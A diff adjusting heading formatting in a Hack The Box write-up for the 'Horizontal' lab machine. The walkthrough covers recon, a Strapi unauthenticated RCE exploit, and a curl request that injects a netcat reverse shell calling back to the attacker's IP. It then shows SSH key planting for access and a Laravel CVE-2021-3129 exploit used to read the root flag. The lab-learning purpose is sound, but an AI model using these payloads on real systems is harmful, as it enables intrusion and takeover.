@@ -1,6 +1,6 @@
 # Machine name - Horizontal 
 
-##Nmap resutls
+## Nmap resutls
 
 ```
 # Nmap 7.91 scan initiated Wed Sep  8 15:57:00 2021 as: nmap -sC -sV -oN nmap 10.10.11.105
@@ -23,31 +23,31 @@ Service detection performed. Please report any incorrect results at https://nmap
                  
 ```
 
-###So we are having web server running on port 80
+### So we are having web server running on port 80
 
-#lets add the ip in the /etc/hosts 
+# lets add the ip in the /etc/hosts 
 ```
 10.10.11.105	horizontal.htb 
 ```
-##Running gobuster on the ip
+## Running gobuster on the ip
 ```
 We didnt find anything usefull
 ```
-##Using gobuster for finding subdomain, and here we find an interesting subdomain 
+## Using gobuster for finding subdomain, and here we find an interesting subdomain 
 ```
 gobuster dns -d horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
-#Subdomain we got
+# Subdomain we got
 ```
 api-prod.horizontal.htb
 ```
 
-##To access this domain we have to add this to /etc/hosts
+## To access this domain we have to add this to /etc/hosts
 ```
 10.10.11.105    horizontal.htb api-prod.horizontal.htb
 ```
 
-##Running gobuster on api-prod.horizontal.htb
+## Running gobuster on api-prod.horizontal.htb
 ```
 /reviews              (Status: 200) [Size: 507]
 /users                (Status: 403) [Size: 60]
@@ -56,15 +56,15 @@ api-prod.horizontal.htb
 /Users                (Status: 403) [Size: 60]
 ```
 
-###Found Some interesting directories, and also find a login page 
+### Found Some interesting directories, and also find a login page 
 ![login page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/Main%20page.png)
 
-##After some research we managed to find the version of strapi 
+## After some research we managed to find the version of strapi 
 ```
 Strapi version 3.0.0-beta.17.7
 ```
 
-##The version of strapi is having 
+## The version of strapi is having 
 ```
 # Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
 # Date: 2021-08-30
@@ -144,7 +144,7 @@ if __name__ == ("__main__"):
 
 
 ```
-###By saving this file as exploit.py we run this expoit to get the username , password and JSON Web Token 
+### By saving this file as exploit.py we run this expoit to get the username , password and JSON Web Token 
 ```
 python3 exploit.py http://api-prod.horizontall.htb/ 
 [+] Checking Strapi CMS Version running
@@ -158,82 +158,82 @@ python3 exploit.py http://api-prod.horizontall.htb/
 [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzAyODExLCJleHAiOjE2MzM4OTQ4MTF9._P5JRoW0OpW0jNNgkxgU-krUzt5oq40hso6PKVvJZQE
 
 ```
-##By using these creds and JSON Token we managed to login through the portal (using burp) 
+## By using these creds and JSON Token we managed to login through the portal (using burp) 
 ![Admin page](https://github.com/sigwotts/HTB-Walkthrough/blob/main/Horizontal/adminpage%20after%20login.png)
 
-##Now we set up a netcat listner
+## Now we set up a netcat listner
 ```
 nc -lnvp 4444
 ```
 
-##This script does not gives us the shell so by getting the reverse shell we use curl 
+## This script does not gives us the shell so by getting the reverse shell we use curl 
 ```
 curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzAyODExLCJleHAiOjE2MzM4OTQ4MTF9._P5JRoW0OpW0jNNgkxgU-krUzt5oq40hso6PKVvJZQE' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14157. 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'
 
 ```
 #BOOOOOOOOOOOOOOMMMMMMMMMMM!!!!!!!!!!!! We got a shell
 
-##Here we got our user flag 
+## Here we got our user flag 
 ```
 cat /home/developer/user.txt
 ```
 
-#User flag
+# User flag
 ```
 3d6982b2cdb88c1e96aa678929ce1327
 ```
 
-#Its time for Privilege escalation
+# Its time for Privilege escalation
 
-###Lets upload linpeas on the server 
+### Lets upload linpeas on the server 
 
-###To do this Start an python http server on your machine 
+### To do this Start an python http server on your machine 
 ```
 sudo python3 -m http.server 8080 
 ```
-##We upload linpeas on the server by using the cmd
+## We upload linpeas on the server by using the cmd
 ```
 wget http://<IP>:8080/linpeas.sh
 ```
 
-##Then by giving linpeas executable permissions
+## Then by giving linpeas executable permissions
 ```
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-#linpeas tells us it is having Larvel v8(PHP v7.4.18) on port 8000, We have to port forward this to our machine and for this we have to generate a pair of ssh keys 
+##linpeas tells us it is having Larvel v8(PHP v7.4.18) on port 8000, We have to port forward this to our machine and for this we have to generate a pair of ssh keys 
 ```
 ssh-keygen
 ```
-#After the key is generated turn on a netcat listner on your machine
+## After the key is generated turn on a netcat listner on your machine
 ```
 nc -lnvp 3333 < /home/kali/.ssh/id_rsa.pub
 ```
-##On the victim machine
+## On the victim machine
 ```
 nc -nv 10.10.14.157 3333 > authorized_keys
 ```
-##Put your IP here
+## Put your IP here
 
-##Then the key will transfer into the /opt/strapi/.ssh/authorized_keys
+## Then the key will transfer into the /opt/strapi/.ssh/authorized_keys
 
-#Once this is complete, you can access it by using
+##Once this is complete, you can access it by using
 ```
 ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb 
 ```
-#Now we are strapi 
+##Now we are strapi 
 ```
 $ id
 uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
 ```
 
-#Now its time to get the root flag by exploiting it by using exploit
+## Now its time to get the root flag by exploiting it by using exploit
 ```
 https://github.com/nth347/CVE-2021-3129_exploit
 ```
 
-##Usage of the exploit
+## Usage of the exploit
 ```
 $ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
 $ cd CVE-2021-3129_exploit
@@ -241,7 +241,7 @@ $ chmod +x exploit.py
 $ ./exploit.py http://localhost:8000 Monolog/RCE1 id
 ```
 
-##From this we got the id, and by obtaining the root flag we have to modify the cmd a little bit
+## From this we got the id, and by obtaining the root flag we have to modify the cmd a little bit
 ```
 sudo ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt" 
 [i] Trying to clear logs
@@ -264,7 +264,7 @@ Resolving deltas: 100% (1016/1016), done.
 
 ```
 
-#BOOOMMMMMMMM!!! HERE WE GOT OUR ROOT FLAG 
+# BOOOMMMMMMMM!!! HERE WE GOT OUR ROOT FLAG 
 
 ```
 454fa3814befe7f4c6f52b06d30ab862
